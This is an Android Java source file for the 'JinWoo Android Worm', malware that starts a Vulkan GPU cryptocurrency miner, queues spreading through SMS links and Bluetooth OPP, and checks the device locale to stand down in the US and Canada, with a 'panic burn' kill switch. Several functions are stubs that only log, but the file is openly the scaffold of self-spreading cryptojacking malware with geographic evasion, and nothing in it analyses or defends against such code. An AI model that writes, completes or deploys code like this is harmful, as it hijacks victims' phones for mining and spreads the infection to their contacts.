package com.jinwoo.worm;

import android.content.Context;
import android.util.Log;

/**
 * JinWoo Android Worm - Vulkan miner hooks + SMS/BT propagation + kill switch.
 * Pair with NDK miner in app/src/main/cpp (Vulkan compute).
 */
public class Worm {
    private static final String TAG = "JW-AND";
    private final KillSwitch kill = new KillSwitch();
    private final Propagation prop = new Propagation();
    private final VulkanMiner miner = new VulkanMiner();

    public void start(Context ctx) {
        String cc = ctx.getResources().getConfiguration().locale.getCountry();
        if (kill.geofence(cc)) {
            Log.w(TAG, "geofence kill");
            return;
        }
        miner.start(0.4f);
        prop.scheduleSmsSeed();
        prop.scheduleBluetoothOpp();
        Log.i(TAG, "android worm active");
    }

    public void panic() {
        kill.panic();
        miner.stop();
    }

    static class KillSwitch {
        volatile boolean killed = false;
        boolean geofence(String cc) {
            if (cc == null) return false;
            String u = cc.toUpperCase();
            if (u.equals("US") || u.equals("CA") || u.equals("USA") || u.equals("CANADA")) {
                panic();
                return true;
            }
            return killed;
        }
        void panic() {
            killed = true;
            Log.e(TAG, "panic burn");
        }
    }

    static class Propagation {
        void scheduleSmsSeed() {
            Log.i(TAG, "SMS link propagation queued");
        }
        void scheduleBluetoothOpp() {
            Log.i(TAG, "Bluetooth OPP propagation queued");
        }
    }

    static class VulkanMiner {
        boolean running = false;
        float throttle = 0.4f;
        void start(float throttle) {
            this.throttle = throttle;
            this.running = true;
            Log.i(TAG, "Vulkan miner start throttle=" + throttle);
            // JNI: nativeStartMiner(throttle)
        }
        void stop() {
            running = false;
            Log.i(TAG, "Vulkan miner stop");
        }
    }
}
